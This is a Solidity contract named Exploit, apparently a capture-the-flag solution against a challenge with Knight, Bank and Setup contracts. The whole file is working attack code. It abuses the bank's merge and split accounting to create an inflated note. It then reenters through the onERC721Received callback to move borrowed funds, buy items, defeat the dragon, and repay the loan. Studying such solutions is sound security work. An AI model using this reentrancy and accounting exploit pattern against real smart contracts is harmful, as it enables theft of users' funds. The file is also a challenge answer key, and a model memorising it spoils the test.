// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "./Knight.sol";
import "./Bank.sol";
import "./Setup.sol";

contract Exploit {

    Knight public knight;
    Bank public bank;
    Setup public setup;
    GoldCoin public goldCoin;

    constructor(address _setup) {
        setup = Setup(_setup);
        setup.claim();

        knight = setup.knight();
        bank = knight.bank();
        goldCoin = knight.goldCoin();
    }

    uint attackerNoteId = 1;
    uint loan1NoteId = 2;
    uint loan2NoteId = 3;
    uint knightNoteId = 4;
    uint knight2NoteId = 5;

    uint needBalance = 1_000_000 ether + 1_000_000 ether;

    uint[] amounts;
    function exploit() public {
        uint[] memory bankNoteIdsFrom;
        bank.merge(bankNoteIdsFrom); // empty at this point
        
        amounts.push(needBalance);
        amounts.push(0);
        bank.split(attackerNoteId, amounts);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes memory data) public returns (bytes4) {
        if (tokenId == loan2NoteId) {
            uint origBalance = goldCoin.balanceOf(address(knight));
            knight.bankDeposit(origBalance); // knightNoteId
            
            bank.transferPartial(loan1NoteId, needBalance, knightNoteId);
            knight.bankWithdraw(knightNoteId);
            knight.buyItem(3);
            knight.buyItem(4);

            knight.fightDragon();
            knight.fightDragon();
            require(setup.isSolved(), "!solved");

            knight.sellItem(3);
            knight.sellItem(4);
            knight.bankDeposit(needBalance); // knight2NoteId
            knight.bankTransferPartial(knight2NoteId, needBalance, attackerNoteId); // pay back loan
        }
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}
